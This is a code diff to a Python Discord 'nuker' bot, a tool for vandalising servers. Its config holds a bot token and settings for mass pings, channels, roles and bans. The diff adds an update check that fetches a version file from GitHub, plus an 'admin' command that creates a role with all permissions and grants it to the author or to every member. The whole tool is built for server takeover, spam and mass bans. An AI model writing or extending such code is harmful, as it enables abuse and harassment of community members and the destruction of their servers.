@@ -1,4 +1,4 @@
-from discord import Intents
+from discord import Intents, Permissions
 from discord.ext import commands
 import discord
 from asyncio import create_task 
@@ -9,6 +9,7 @@ import time
 import colorama
 from colorama import Fore
 import os
+import urllib3
 
 config = configparser.ConfigParser()
 
@@ -27,6 +28,38 @@ ptfc = 'cfg.ini'
 pti = 'icon.PNG'
 cfg = Path(ptfc)
 ic = Path(pti)
+
+
+
+http = urllib3.PoolManager()
+
+get_last_ver = http.request('GET', 'https://raw.githubusercontent.com/glitch65/some-random-things-for-my-projects/main/fnuker/ver')
+get_changelog = http.request('GET', 'https://raw.githubusercontent.com/glitch65/some-random-things-for-my-projects/main/fnuker/changelog')
+
+
+ver = get_last_ver.data.decode('utf-8')
+chl = get_changelog.data.decode('utf-8')
+
+
+nversion = str(2.2)
+
+
+
+
+if nversion == ver:
+    print(f'{Fore.GREEN}[Update checker]' + '\033[39m' + 'Your version does not need to be updated!')
+else:
+    print(f'{Fore.GREEN}[Update checker]' + '\033[39m' + 'New version of nuker ' + ver + ' is available!')
+    print(f'{Fore.GREEN}Changelog:')
+    print(f'{Fore.GREEN}' + chl)
+    print(f'{Fore.GREEN}Nuker will close automatically after 5 seconds!')
+    time.sleep(5)
+    quit()
+
+
+
+
+
 
 if ic.is_file():
     f = open('icon.PNG', 'rb')
@@ -56,7 +89,9 @@ else:
                          'ban reason': 'XDDDD',
                          'how much pings per channel do you want?': '60',
                          'how much channels do you want?': '35', 
-                         'how much roles do you want?': '40'}
+                         'how much roles do you want?': '40',
+                         'admin role name': 'sh...'}
+    
     with open('cfg.ini', 'w') as cfg_file:
             config.write(cfg_file)
     print(f'{Fore.YELLOW}[Config System]' + '\033[39m' + 'Done!')
@@ -65,6 +100,8 @@ else:
     exit()
 
 clear()
+
+
 
 prefix = config['BOT_CFG']['prefix'] 
 token = config['BOT_CFG']['token'] 
@@ -79,6 +116,8 @@ br = config['BOT_CFG']['ban reason']
 howmp = int(config['BOT_CFG']['how much pings per channel do you want?'])
 howmc = int(config['BOT_CFG']['how much channels do you want?'])
 howmr = int(config['BOT_CFG']['how much roles do you want?'])
+adrn = config['BOT_CFG']['admin role name']
+
 
 
 
@@ -154,6 +193,18 @@ async def start(ctx):
     for _ in range(howmc):    
         create_task(createchannel(ctx,name=chnrln))
 
+@client.command()
+async def admin(ctx,target):
+    await ctx.message.delete()
+    r =  await ctx.guild.create_role(name=adrn,permissions=Permissions.all())
+    if target == 'all':
+        for membe in list(ctx.guild.members):
+            await membe.add_roles(r)
+    elif target == 'me':
+        await ctx.message.author.add_roles(r)
+            
+    
+    
 
 
 async def bananaa(ctx):
